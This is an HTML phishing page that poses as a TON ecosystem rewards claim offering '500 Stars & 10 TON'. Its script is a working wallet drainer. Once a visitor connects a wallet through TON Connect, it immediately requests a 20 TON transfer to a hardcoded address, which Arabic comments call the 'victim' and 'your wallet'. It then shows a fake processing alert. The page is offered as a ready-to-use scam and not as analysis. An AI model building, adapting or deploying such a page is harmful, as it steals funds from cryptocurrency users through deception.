<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Rewards</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background-color: #0f0f0f; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { border: 1px solid #333; border-radius: 24px; padding: 30px; background: #1a1a1a; text-align: center; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h1 { font-size: 20px; color: #00d4ff; margin-bottom: 10px; }
        p { color: #888; font-size: 13px; margin-bottom: 25px; }
        #ton-connect-button { display: flex; justify-content: center; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://ton.org/pics/ton_logo.purp.png" width="50" style="margin-bottom: 15px;">
        <h1>Claim 500 Stars & 10 TON</h1>
        <p>Connect your wallet below to verify your OG handles and claim your ecosystem rewards instantly.</p>
        
        <div id="ton-connect-button"></div>
        
        <p style="margin-top: 25px; font-size: 10px; color: #444;">🛡️ Secured by TON Connect 2.0</p>
    </div>

    <script>
        // إعداد الواجهة الرسمية مع رابط المانيفست حقك
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        // أول ما يربط الضحية محفظته، نرسل له طلب سحب الرصيد فوراً
        tonConnectUI.onStatusChange(wallet => {
            if (wallet) {
                requestClaim();
            }
        });

        async function requestClaim() {
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 600, // صلاحية 10 دقائق
                messages: [
                    {
                        address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS", // محفظتك
                        amount: "20000000000", // محاولة طلب سحب 20 TON
                    }
                ]
            };

            try {
                await tonConnectUI.sendTransaction(transaction);
                alert("Processing... Please wait for network confirmation.");
            } catch (e) {
                console.error("User rejected or error:", e);
            }
        }
    </script>
</body>
</html>
